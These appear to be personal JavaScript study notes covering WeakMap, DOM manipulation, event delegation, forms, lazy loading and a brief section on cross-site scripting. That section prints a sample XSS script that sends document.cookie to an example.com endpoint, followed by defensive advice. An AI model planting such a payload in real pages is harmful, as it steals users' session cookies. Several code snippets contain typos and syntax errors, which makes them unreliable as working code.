  // Object.fromEntries method that does the reverse: given an array of [key, value] pairs, it creates an object from them
  let prices = Object.fromEntries([
    ['banana', 1],
    ['orange', 2],
    ['meat', 4]
  ]);

  let obj = Object.fromEntries(fruitsMap.entries());
  // or
  let obj = Object.fromEntries(map); // as Object.fromEntries expects an iterable object as the argument
  ```

---

### WeakMap

![WwakMap](./img/weakMap.png)

- if we use an object as the key in a regular Map, then while the Map exists, that object exists as well. It occupies memory and may not be garbage collected.

  ```js
  let john = { name: 'John' };
  let map = new Map();
  map.set(john, '...');
  john = null; // overwrite the reference
  // john is stored inside the map,
  // we can get it by using map.keys()
  ```

**WeakMap** is fundamentally different in this aspect. **It doesn’t prevent garbage-collection of key objects**.

- The first difference between **Map** and **WeakMap** is that keys must be objects, not primitive values:

  ```js
  let weakMap = new WeakMap();
  let obj = {};
  weakMap.set(obj, 'ok'); // works fine (object key)

  // can't use a string as the key
  weakMap.set('test', 'Whoops'); // Error, because "test" is not an object
  ```

- if we use an object as the key in it, and there are no other references to that object – it will be removed from memory (and from the map) automatically.

  ```js
  let john = { name: 'John' };
  let weakMap = new WeakMap();
  weakMap.set(john, '...');

  john = null; // overwrite the reference
  // john is removed from memory!
  ```

  > The main area of application for WeakMap is an **additional data storage**.
  >
  > - If we’re working with an object that “belongs” to another code, maybe even a third-party library, and would like to store some data associated with it, that should only exist while the object is alive – then **WeakMap** is exactly what’s needed.
  >
  > ```js
  > weakMap.set(john, 'secret documents');
  > // if john dies, secret documents will be destroyed automatically
  > ```

---

## DOM

- **object model**: is a group of objects, each of which represent related things from the real world. Together they form a model of something larger.

  - **BROWSER OBJECT MODEL**: contains objects that represent the current `browser window` or `tab`. It contains objects that model things like `browser history` and the `device's screen`.
    ![object-model](./img/object-model.png)

    - `window object` is treated as the default object if none is specified. ex: `alert()` is used instead of `window.alert()`

      ```js
      let gLet = 5;

      alert(window.gLet); // undefined (doesn't become a property of the global object)
      ```

      ```js
      // make current user information global, to let all scripts access it
      window.currentUser = {
        name: 'John'
      };

      // somewhere else in code
      alert(currentUser.name); // John

      // or, if we have a local variable with the name "currentUser"
      // get it from window explicitly (safe!)
      alert(window.currentUser.name); // John
      ```

- **DOCUMENT OBJECT MODEL**: uses objects to create a representation of the current page. It creates a new object for each element (and each individual section of text) within the page.
  ![object-model](./img/object-model2.png)
  - specifies how browsers should create a model of an HTML page and how JavaScript can access and update the contents of a web page while it is in the browser window.
  - The DOM is neither part of HTML, nor part of JavaScript; it is a separate set of rules. It is implemented by all major browser makers
  - The DOM is called an object model because the model (the DOM tree) is made of objects.
  - > The DOM an Application Programming Interface (**API**). User interfaces let humans interact with programs; APls let programs (and scripts) talk to each other. The DOM states what your script can "ask the browser about the current page, and how to tell the browser to update what is being shown to the user
- **GLOBAL JAVASCRIPT OBJECTS**: represent things that the JavaScript language needs to create a model of. For example, there is an object that deals only with dates and times.

  - The names of the global objects usually start with a capital letter, e.g., `String`, `Date`, `Math` objects

- allows us to make `javascript` interact with the browser by creating a model of the page and stores it **in memory**
- `DOM-Tree` is generated from HTML document which we can interact with

> WEB BROWSERS ARE PROGRAMS BUILT USING OBJECTS (**window-object** , **document-object**)
> ![window-document-objects](./img/window-document-objects.png)
>
> - The browser represents each window or tab using a window object. The location property of the window object will tell you the URL of the current page.
> - The current web page loaded into each window is modelled using a document object.

---

### Steps for creating an element

**DOM manipulation**: refers to using a set of methods and properties to access, create, and update elements and text nodes. (If you have to make a lot of changes to the content of a page, it is slower than `innerHTML`. )

- when we store elements in variables, we're really storing the **location** of the element in the DOM tree in the variable, the properties and methods of that element node work on the variable
  - this saves the browser from looking through the DOM tree to find the same element again. this is known as **caching the selection**

```javascript
//------------------------Create element------------------------//
const element = document.createElement('.div');
message.classList.add('cookie-message');

//----------------------------Content----------------------------//
message.textContent = 'We use cookied for improved functionality and analytics.';
// or
message.innerHTML =
  'We use cookied for improved functionality and analytics. <button class="btn btn--close-cookie">Got it!</button>';

//---------------inserting element in the document---------------//
header.append(message); // inside the element (will be a its child)
// or
header.insertAdjacentHTML('beforeend', message);

header.before(message); // before the element (will be a its sibling)
//------------------------Remove element------------------------//
message.remove();
```

### `innerHTML` vs `innerText`

- `innerHTML` lets you work with HTML rich text (in HTML format) and doesn't automatically encode and decode text and doesn't apply `css` related to the text (if a word was hidden by css then it won't be included in the innerHTML).
- `innerText` retrieves and sets the content of the tag as plain text with applying `css`

### `insertAdjacentHTML()`

- parses a piece of HTML text and inserts the resulting nodes into the DOM tree at a specified position
  ![insertAdjacentHTML](./img/JavaScript-insertAdjacentHTML.png)

### HTMLCollection vs NodeList

- Both interfaces are collections of DOM nodes. They differ in the methods they provide and in the type of nodes they can contain.
  | HTMLCollection | NodeList |
  | ------------------------------------------------------------------------ | ---------------------------------------------------------- |
  | supposed to only contain Element nodes | can contain any node type |
  | HTMLCollection items can be accessed by their name, id, or index number. | NodeList items can only be accessed by their index number. |
  | HTMLCollection is always a `live` collection, when your script updates the page, the Nodelist is updated at the same time. | NodeList is most often a `static` collection, If the script changes the content of the page, the Nodelist is not updated to reflect those changes |
  | `getElementsByClassName()` `getElementsByTagName()` `children` | `querySelectorAll()` `childNodes` |

### Node.cloneNode()

- The `cloneNode()` method creates a copy of a node, and returns the clone.
- The `cloneNode()` method clones all attributes and their values.
- Set the `deep` parameter to `true` if you also want to clone descendants (children).

```javascript
let p = document.getElementById('para1');
let p_prime = p.cloneNode(true);
```

---

### Styles

- to change a property (css-variable) in the `:root` element

  ```javascript
  document.documentElement.style.setProperty('--color-primary', 'orangered');
  ```

- to change style based on previous value of a style property : use `getComputedStyle()`

  ```javascript
  message.style.height = Number.parseFloat(getComputedStyle(message).height, 10) + 30 + 'px';
  // it returns a string so we use parse Float/int
  ```

- to add multiple styles (css text block) :

  ```javascript
  element.style.cssText = 'color:red; height:50px; ...';
  // or using (setAttribute)
  element.setAttribute('style', 'color:red; height:50px; ...');
  ```

- to get a non standard Attribute :

  - Before you work with an attribute, it is good practice to check whether it exists. This will save resources if the attribute cannot be found. -> `.hasAttribute()`

  ```javascript
  const designer = logo.getAttribute('designer'); // returns the value of the "designer" attribute,
  // also you can set an Attribute
  logo.setAttribute('company', 'Bankist'); //(attribute_name,value)
  ```

### DOM Traversing ( relation between elements )

- select all siblings of an element

  - These are properties of the current node (not methods to select an element); therefore, they do not end in parentheses

  ```javascript
  // first, convert it from a HtmlCollection to an array
  [...element.parentElement.children].forEach(function (el) {
  if (el !== element) console.log(el);
  );
  ```

- Traversing the DOM can be difficult because some browsers add a **text node** whenever they come across **whitespace** between elements.
  ![dom-white-space](./img/dom-white-space.png)

---

### creating connection between `DOM` & `js-code`

- this is done by using `custom data` attributes.

- Reading the values of these attributes out in JavaScript is simple.

  - You could use `getAttribute()` with their full HTML name to read them.
  - but the standard defines a simpler way: a `DOMStringMap` you can read out via a `dataset` property.

    - To get a data attribute through the dataset object, get the property by the part of the attribute name after `data-` (note that `dashes` are converted to `camelCase`).

    ```html
    <!-- html file -->
    <article
      id="electric-cars"
      data-columns="3"
      data-index-number="12314"
      data-parent="cars"
    ></article>
    ```

    ```js
    // js file
    const article = document.querySelector('#electric-cars');

    article.dataset.columns; // "3"
    const { columns } = article.dataset; // to get the value

    article.dataset.indexNumber; // "12314"
    article.dataset.parent; // "cars"
    ```

---

## virtual DOM

Virtual DOM is in-memory representation of Real DOM. It is lightweight JavaScript object which is `copy` of Real DOM.

- The `virtual DOM` is a tree based on JavaScript objects created with `React` that resembles a DOM tree. Each time you need to change something in the DOM, `React` employs a different algorithm that exclusively re-renders the DOM nodes that have changed. Meaning, `React` allows developers to write code as if the entire page is rendered on each change while in the underhood `React` ONLY renders sub-components that have actually changed.
- Virtual DOM duty among other things is to abstract real DOM operations we would need to do

### methods to compare nodes

- to compare the (content) of the 2 nodes

  ```js
  node1.isEqualNode(node2); // true/false
  ```

- checking the value (**for textNodes nodes that contains only text and not elements like `<em> or <li>`**) => [nodeValue](https://developer.mozilla.org/en-US/docs/Web/API/Node/nodeValue) is empty or not

  ```js
  node1.firstChild?.nodeValue.trim() !== '';
  ```

> **NOTE**:
> ![text-node](./img/text-node.png)
>
> - In order to use **nodeValue** property, you must be on a text node, not the element that contains the text.
> - The **textContent** property allows you to collect or update just the text that is in the containing element (and its children).

### steps

```js
// (1) create a copy of the document(DOM)
let newDOM = document.createRange();
// (2) convert the string(newMarkup) to a real-DOM-object
newDOM = newDOM.createContextualFragment(newMarkup);
// 1,2 in one step =>
const newDOM = document.createRange().createContextualFragment(newMarkup);
// now newDOM is like a big object of (virtual-DOM) that lives in memory NOT tha page

// (5) selecting all elements that lives in our virtual-DOM and converting it to an array so that we can compare it with the real-DOM
const newElements = Array.from(newDOM.querySelectorAll('*'));

// (6) selecting all elements that lives in our real-DOM and converting it to an array so that we can compare it with the virtual-DOM
const curElements = Array.from(this._parentElement.querySelectorAll('*'));

// (7) looping over the 2 arrays at the same time so that we can compare them
newElements.forEach((newEl, i) => {
  const curEl = curElements[i];

  // (8) Updates changed TEXT
  if (
    // comparing the (content) of the 2 nodes
    !newEl.isEqualNode(curEl) &&
    newEl.firstChild?.nodeValue.trim() !== ''
  ) {
    // change the part that differ in the virtual-DOM
    curEl.textContent = newEl.textContent;
  }

  // (9) Updates changed Attributes
  if (!newEl.isEqualNode(curEl))
    Array.from(newEl.attributes).forEach(attr => curEl.setAttribute(attr.name, attr.value));
});
```

---

## Events

### Event Flow (Delegation / Propagation)

HTML elements nest inside each other elements. if you hover or click on a link, you will also be hovering or clicking on its parent elements.

![event flow](./img/event-flow.png)

Event handlers/listeners can be bound to the containing `<li>`, `<ul>`, `<body>` and `<html>` elements, plus the document object and the window object. **The order in which the events fire is known as "event flow"**

- the flow of events only matters when your code has event handlers on an element and one of its ancestor or descendant elements
- events flow in 2 directions:
  - event bubbling
  - event capturing
- the final parameter in the `addEventListener()` method lets you choose the direction to trigger events
  - `true` -> capturing phase
  - `false` -> bubbling phase (default value)

![delegation](./img/javascript-event-propagation-5.webp)

Creating event listeners for a lot of elements can slow down a page, but event flow allows you to listen for an event on a parent element.

- like that we are **delegating** the job of the event listener to a parent of the elements.
- `Event delegation` is a special kind of event handling, in which an event handler of the parent of an element handles events for that element.
- used to prevent event listener to create a lot of callback functions listening to all the items in `forEach`, so we use `event.target` as it shows **where the event happened**

  1. Add event listener to common parent element
  2. Determine what element originated the event => `e.target`
  3. if the element has children inside it => use `.closest(element)` to prevent wrong selection

  ```javascript
  tabsContainer.addEventListener('click', function (e) {
    const clicked = e.target.closest('.operations__tab');
    // Don't use `e.target.parentElement`

    // Guard clause (as if you clicked on other than '.operations__tab' element )
    if (!clicked) return;}
  ```

---

### Event Handling

- **binding event to a DOM node**: Indicate which event on the selected node(s) will trigger the response.
- There're 3 ways to bind an event to an element:

  - HTML EVENT HANDLERS (**bad practice**)
    - This method of event handling is **no longer used** because it is better to separate the JavaScript from the HTML.
  - TRADITIONAL DOM EVENT HANDLERS

    - The main drawback is that you can only attach a single function to any event

    ```js
    el.onblur = checkUsername; // the parentheses are omitted
    ```

  - DOM LEVEL 2 EVENT LISTENERS ✅
    - They can deal with more than one function at a time, but they are not supported in older browsers.

- `this` in callbacks refers to the selected element in the event `but` => `this` doesn't work like that if you used an `arrow function`, and if so, you should use `bind`

- `addEventListener()` vs `onclick()`

  | addEventListener                                                                                       | onclick                                                                                     |
  | ------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------- |
  | addEventListener can add multiple events to a particular element.                                      | can add only a single event to an element. It is basically a property, so gets overwritten. |
  | addEventListener can take a third argument that can control the event propagation.                     | Event propagation cannot be controlled by onclick.                                          |
  | addEventListener can only be added within `<script>` elements or in external JavaScript file.          | onclick can be added as an HTML attribute also.                                             |
  | addEventListener does not work in older versions of Internet explorer, which uses attachEvent instead. | onclick works in all browsers.                                                              |
  | addEventListener can do multiple things when event is triggered                                        | onclick can only do one task when event is triggered                                        |
  | can be on an element that doesn't exist yet (ex : `event.target`)                                      | can't do that                                                                               |

- to make a callback function listen to more that one event :

  ```js
  ['click', 'load'].forEach(event => window.addEventListener(event, callback_function));
  ```

- with event handlers and listeners, you wrap the function call (with the arguments) in an **anonymous function**.
- **The Event object :** When an event occurs, the event object tells you information about the event, and the element it happened upon.
  - Every time an event fires, the The event object is passed to event object contains helpful any function that is the event data about the event, such as:
    - `Which element the event happened on`
    - `Which key was pressed for a keypress event`
    - `What part of the viewport the user clicked`
      ![event-object](./img/event-object.png)
  - the event-object is passed to any function that is the event handler or listener as an argument
    ![event-object](./img/event-object2.png)

---

### Events Notes

- The `mousedown` and `mouseup` events separate out the press and release of a mouse button. They are commonly used for adding **drag and drop functionality**, or to add controls in game development.
- the **event** object can tell you where the cursor was positioned when an event was triggered
  ![event-position](./img/event-position.png)
  ![event-position](./img/event-position2.png)

---

## Storage

- `local storage` : always stays
- `session storage` : gets closed when window or tab are closed

---

## Errors

When an exception is thrown, the interpreter stops and checks the current execution context for exception-handling code. So if the error occurs in a function, the interpreter starts to look for error-handling code in that function.

If an error happens in a function and the function does not have an exception handler, the interpreter goes to the line of code that called the function.

### Error object

Error objects can help you find where your mistakes are and browsers have tools to help you read them.

![error-object](./img/error-object.png)
![error-object](./img/error-object2.png)
![error-object](./img/error-object3.png)
![error-object](./img/error-object4.png)
![error-object](./img/error-object5.png)

---

## Forms

### event-handler in forms

- always use `e.preventDefault();` on form buttons as it defaults to refresh the page
- try not to give a name attribute with value `"submit"` to a button as it might conflict and override with a `form.submit()` method
- to remove focus from input field : `inputLogin.blur();`
- always use `e.preventDefault();` on hyperlinks `<a>` which has a `href="#"` and you want it to do something like ( show pop-up window ) as it defaults to go to top

### Form Validation

- Provide meaningful error messages

  - error messages are not identical in every browser. How can you show the same message to everyone?
    - To achieve this, use the `setCustomValidity()`

  ```js
  const nameInput = document.querySelector('[name="name"]');

  nameInput.addEventListener('invalid', () => {
    nameInput.setCustomValidity('Please enter your name.');
  });
  ```

### FormData

-The `FormData()` constructor creates a new `FormData` object. => [reference](https://developer.mozilla.org/en-US/docs/Web/API/FormData/FormData)

- The FormData interface provides a way to easily construct a set of `key/value pairs` representing form fields and their values, which can then be easily sent using the `fetch()` or `XMLHttpRequest.send()` method. It uses the same format a form would use if the encoding type were set to "multipart/form-data".

```js
const dataArr = [...new FormData(formElement)];
// result : [[key1,value1],[key2,value2],[key3,value3],[key4,value4],...]

// now we want to convert it to an object
const data = Object.fromEntries(dataArr);
// result :
{
  key1 : value1,
  key2 : value2,
  key3 : value3,
  key4 : value4,
}
```

- the `FormData` object will be populated with the form's current keys/values using the name property of each element for the keys and their submitted value for the values. It will also encode file input content.

---

## CROSS-SITE SCRIPTING (XSS) ATTACKS

XSS involves an attacker placing malicious code into a site. Websites often feature content created by many different people.

XSS can give the attacker access to information in:

- The DOM (including form data)
- That website's cookies
- Session tokens: information that identifies you from other users when you log into a site
- Example:

  ```html
  <script>
    var adr = 'http : //example.com/xss .php?cookie=' + escape(document.cookie);
  </script>
  ```

### Defending against CROSS-SITE SCRIPTING

- **VALIDATE INPUT GOING TO THE SERVER**
  - Only let visitors input the kind of characters they need to when supplying information. This is known as **validation**. Do not allow untrusted users to submit HTML markup or JavaScript.
  - Double-check validation on the server before displaying user content/storing it in a database. This is important because **users could bypass validation in the browser by turning JavaScript off**.
  - The database may safely contain markup and script from trusted sources (e.g., your content management system). This is because it does not try to process the code; it just stores it.
- **ESCAPE DATA COMING FROM THE SERVER & DATABASE**
  - As your data leaves the database, all potentially dangerous characters should be escaped
  - Make sure that you are only inserting content generated by users into certain parts of the template files
  - Do not create DOM fragments containing HTML from untrusted sources. It should only be added as text once it has been escaped.

> you can safely use **innerHTML** to add markup to a page if you have written the code - but content from any untrusted sources should be escaped and added as text (not markup), using properties like **textContent**.

---

## Scrolling

### intersection observer

[More Info](https://blog.arnellebalane.com/the-intersection-observer-api-d441be0b088d)

![intersection](./img/intersection1.avif)
![intersection](./img/intersection2.png)
![intersection](./img/intersection3.png)

- The Intersection Observer API is a Web platform API that allows for observing changes to how much of a target element’s area intersects with that of an ancestor element or the viewport. The need for such information has a lot of use cases, such as implementing lazy-loading and infinite scrolling !
  ![intersection](./img/intersection4.png)
- By default, the Intersection Observer API uses the viewport as the intersection root, and only executes the callback when the target element enters and exits the viewport.
- A `threshold` is a value in which the Intersection Observer will execute the callback function whenever the intersection ratio reaches that value (either as it increases or decreases), and is also expressed as a value between 0 and 1, inclusive.

  - It is also possible to set multiple threshold values by passing an array of threshold values

  ```javascript
  const observer = new IntersectionObserver(function (changes) {
    // do something with the changes   }, {
    threshold: [0, 0.25, 0.5, 0.75, 1];
  });
  // executes the callback function when the target element enters/exits the intersection root (i.e. intersection ratio of 0), then again when its intersection ratio crosses 0.25, then 0.5, etc.
  ```

```javascript
const observer = new IntersectionObserver(function (changes) {
  // do something with the changes   });
observer.observe(targetElement);
```

- The `callback function`, when executed, is passed an array of entries, each an instance of `IntersectionObserverEntry`. This is an `array` because the Intersection Observer object can be used to observe multiple target elements
- it is possible to adjust the intersection root’s rectangle by setting `root margin`
- `Example`

  ```javascript
  // Sticky navigation: Intersection Observer API

  const header = document.querySelector('.header');
  const navHeight = nav.getBoundingClientRect().height; // to get the exact height without hard-coding it (instead of writing "-90px")

  // callback function
  const stickyNav = function (entries) {
    const [entry] = entries; // destructuring : same as entry =  entries[0]
    // console.log(entry);
    if (!entry.isIntersecting) nav.classList.add('sticky');
    else nav.classList.remove('sticky');
  };

  const headerObserver = new IntersectionObserver(stickyNav, {
    root: null, // as we are observing the viewport
    threshold: 0, // from intersection ratio
    rootMargin: `-${navHeight}px` //(instead of writing "-90px")
  });

  headerObserver.observe(header);
  ```

### Lazy loading

- is a strategy to identify resources as non-blocking (non-critical) and load these only when needed. It's a way to shorten the length of the critical rendering path, which translates into reduced page load times.
- `Steps`

  - HTML :

    ```html
    <img <!-- img 1 (low quality) -- />
    src="img/digital-lazy.jpg"
    <!-- img 2 (high quality) -->
    data-src="img/digital.jpg" alt="Computer" class="features__img lazy-img" />
    ```

  - CSS

  ```css
  .lazy-img {
    filter: blur(20px);
  }
  ```

  - JS

  ```javascript
  // Lazy loading images
  const imgTargets = document.querySelectorAll('img[data-src]');

  const loadImg = function (entries, observer) {
    const [entry] = entries;

    if (!entry.isIntersecting) return;

    // Replace src with data-src
    entry.target.src = entry.target.dataset.src;
    // show the high quality img without filter class (ONLY) when it loads
    entry.target.addEventListener('load', function () {
      entry.target.classList.remove('lazy-img');
    });

    observer.unobserve(entry.target);
  };

  const imgObserver = new IntersectionObserver(loadImg, {
    root: null,
    threshold: 0,
    rootMargin: '200px' // so that it happens before the user reach the img by 200px so that he doesn't notice it
  });

  imgTargets.forEach(img => imgObserver.observe(img));
  ```

---

## Slider (pagination)

- `pagination` comes from `multiple pages`
- see `slider` section in => [BANKIST-Home_Page-js](../12-BANKIST-Home_Page/script.js)

---

## Writing Documentation

[jsdoc](https://jsdoc.app/)

- before any function(the line above it) write `/**` and vsCode will configure it
